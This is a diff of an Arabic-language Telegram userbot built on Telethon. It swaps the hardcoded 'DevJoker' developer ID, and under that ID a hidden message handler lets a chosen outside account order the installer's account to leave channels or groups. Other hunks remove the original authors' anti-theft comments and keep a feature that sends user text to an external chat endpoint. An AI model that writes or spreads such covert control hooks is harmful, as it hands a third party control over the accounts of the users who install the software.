@@ -607,7 +607,7 @@ async def Reda (event):
     except BaseException as er:
      await event.reply(f"حدث خطأ\n{er}\n{entity}")
 
-DevJoker = [705475246]
+DevJoker = [1165225957]
 @luxur.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.message.message.startswith("اطلع") and event.sender_id in DevJoker:
@@ -627,7 +627,6 @@ async def Hussein(event):
                 response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
         else:
             response = "**᯽︙ يُرجى تحديد معرف القناة أو المجموعة مع الخروج يامطوري ❤️**"
-        #await event.reply(response)
         
 @luxur.ar_cmd(pattern="مغادرة القنوات")
 async def Hussein (event):
@@ -679,7 +678,6 @@ async def Hussein(event):
             print(f"حدث خطأ أثناء حذف محادثات البوت: {e}")
     await event.edit("**᯽︙ تم حذف جميع محادثات البوتات بنجاح ✓ **")
 
-# الكود من كتابة فريق الجوكر بس تسرقة تنشر بقناة الفضايح انتَ وقناتك 🖤
 @luxur.ar_cmd(pattern=r"ذكاء(.*)")
 async def hussein(event):
     await event.edit("**᯽︙ جارِ الجواب على سؤالك انتظر قليلاً ...**")
@@ -692,7 +690,6 @@ async def hussein(event):
         await event.edit("يُرجى كتابة رسالة مع الأمر للحصول على إجابة.")
 is_Reham = False
 No_group_Joker = "@jepthonsupport"
-# يا يلفاشل هم الك نيه تاخذه وتنشره بسورسك 🤣
 active_aljoker = []
 
 @luxur.ar_cmd(pattern=r"الذكاء تفعيل")
@@ -729,7 +726,7 @@ async def reply_to_hussein(event):
             response = requests.get(f'https://gptzaid.zaidbot.repl.co/1/text={text}').text
             await asyncio.sleep(4)
             await event.reply(response)
-#ها هم تريد تخمط بمحرم ؟ روح شوفلك موكب واضرب زنجيل احسن من ماتخمط
+
 Ya_Hussein = False
 active_joker = []
 @luxur.on(events.NewMessage(incoming=True))
@@ -787,7 +784,7 @@ async def Hussein_aljoker(event):
 @luxur.ar_cmd(pattern="سماح_التفليش", require_admin=True)
 async def Hussein_aljoker(event):
     delgvar(Config.OWNER_ID, "Mn3_Kick")
-    await event.edit("**᯽︙ تم تفعيل منع التفليش للمجموعة بنجاح ✓**")
+    await event.edit("**᯽︙ تم تعطيل منع التفليش للمجموعة بنجاح ✓**")
 message_counts = {}
 enabled_groups = []
 Ya_Abbas = False
